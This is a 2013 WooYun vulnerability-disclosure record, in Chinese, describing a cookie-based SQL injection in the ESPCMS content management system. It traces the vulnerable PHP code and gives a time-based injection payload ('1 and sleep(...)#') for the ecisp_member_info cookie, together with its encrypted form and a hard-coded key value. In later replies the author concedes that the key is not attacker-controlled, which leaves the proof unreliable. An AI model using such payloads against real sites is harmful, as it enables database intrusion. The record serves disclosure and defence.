{"id": 9758, "wybug_id": "wooyun-2013-025922", "wybug_title": "易思espcms某处sql注入漏洞，附详细分析与POC代码", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "l5ffy", "wybug_date": "2013-06-14 14:11", "wybug_open_date": "2013-09-12 14:12", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-08-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-12：\t细节向公众公开  简要描述： 小菜刚学代码审核 详细说明：  文件 /interface/forummain.php中$userid未过滤进入sql语句 第17行到32行\nfunction in_list() {\t\tparent::start_pagetemplate();\t\tparent::member_purview(0, $this->mlink['orderlist']);\t\tinclude_once admin_ROOT . 'public/class_pagebotton.php';\t\t$lng = (admin_LNG == 'big5') ? $this->CON['is_lancode'] : admin_LNG;\t\t$page = $this->fun->accept('page', 'G');\t\t$page = isset($page) ? intval($page) : 1;\t\t$pagesylte = 1;\t\t$pagemax = intval($this->CON['bbs_max_list']);\t\t$userid = $this->ec_member_username_id;\t\tif (empty($userid)) {\t\t\t$this->callmessage($this->lng['db_err'], $_SERVER['HTTP_REFERER'], $this->lng['gobackurlbotton']);\t\t}\t\t$db_table = db_prefix . 'bbs';\t\t$db_where = \" WHERE userid=$userid\";\t\t$countnum = $this->db_numrows($db_table, $db_where);\nparent::member_purview的定义了如何获取$this->ec_member_username_id在文件/public/class_connector.php第415行\nfunction member_purview($userrank = false, $url = null, $upurl = false) {\t\t$this->ec_member_username = $this->fun->eccode($this->fun->accept('ecisp_member_username', 'C'), 'DECODE', db_pscode);\t\t$user_info = explode('|', $this->fun->eccode($this->fun->accept('ecisp_member_info', 'C'), 'DECODE', db_pscode));\t\tlist($this->ec_member_username_id, $this->ec_member_alias, $this->ec_member_integral, $this->ec_member_mcid, $this->ec_member_email, $this->ec_member_lastip, $this->ec_member_ipadd, $this->ec_member_useragent, $this->ec_member_adminclassurl) = $user_info;\n其中$this->fun->accept('ecisp_member_username', 'C')表示获取cookie中的ecisp_member_username字段，$this->fun->eccode($this->fun->accept('ecisp_member_info', 'C'), 'DECODE', db_pscode)中的ecode函数在文件 \\public\\class_function.php第164行，密钥是预定义滴，在文件\\datacahe\\public.php db_pscode=4a551878502e4a3fe6f6c2b853因此$userid从cookie中解密获取后没有做处理，就赋值给$db_where，进入函数$this->db_numrows该函数定义在\\public\\class_connector.php第293行\nfunction db_numrows_ds($db_table, $db_where, $field) {\t\t$resulted = $this->db->query('SELECT COUNT(DISTINCT ' . $field . ') AS num FROM ' . $db_table . $db_where);\t\t$resulted = $this->db->fetch_assoc($resulted);\t\treturn $resulted['num'];\t}\n跟进$this->db->query在文件\\pulic\\class_dbmysql.php第55行\nfunction query($sql, $type = '', $cachetime = FALSE) {\t\t\t$func = $type == 'UNBUFFERED' && @function_exists('mysql_unbuffered_query') ? 'mysql_unbuffered_query' : 'mysql_query';\t\tif (!($query = $func($sql, $this->link)) && $type != 'SILENT') {\t\t\tif (!$this->netclass) {\t\t\t\t$this->halt('MySQL Query Error', $sql);\n最后进入mysql_query函数，产生cookie注入   漏洞证明：  注册 登录 发表一条留言后，使用本文件自带的encode函数，解密cookie的ecisp_member_info字段，值为：1||0|1|test@test.com|2130706433|2130706433|e0b858f1249c7bbe85c69dcf5eaac720|b8b9ba7f3baab2ada16559236998ceb4修改为：1 and sleep(9.999999)#||0|1|test@test.com|2130706433|2130706433|e0b858f1249c7bbe85c69dcf5eaac720|b8b9ba7f3baab2ada16559236998ceb4加密后为：ZFTCo5lRq6OdmqBanmKabJ-eb59fhq7eaLFksNWaqKV4q52opGDIo86vmJZplm2TaJZraK9mkmhlaGhtbGhjrspkw2ubnZyXaJdrxW-XlZmZaphncZubm2WXxpXEapiVsshuxWvEmWyZZ8OWlpNqmJyWYWiaaZplmZtvn27Gl8Rs在执行打印执行的sql语句，并运行：\n\n   修复方案：  有点乱，不知道到能过吗   版权声明：转载请注明来源 l5ffy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-06-14 15:42 厂商回复： 感谢您对此漏洞的提供，我们已发测试确认此漏洞存在，近快将提供升级！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-18 10:20 |    \t\t乌云合作伙伴-知道创宇(乌云厂商)\t\t \n  \"密钥是预定义滴，在文件\\datacahe\\public.php db_pscode=4a551878502e4a3fe6f6c2b853 \" 你这个db_pscode 怎么得到嘛    \n     2013-06-18 11:55 |    \t\tl5ffy \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 好好学习，天天向上)\t\t \n  @乌云合作伙伴-知道创宇 是呀，之前忽略了这个，后来发现这个密钥是不可控滴，对不起，有点问题    \n     2015-09-01 22:19 |    \t\tElliott \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:9        | 绝逼不当程序员)\t\t \n  洞主好尴尬==    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}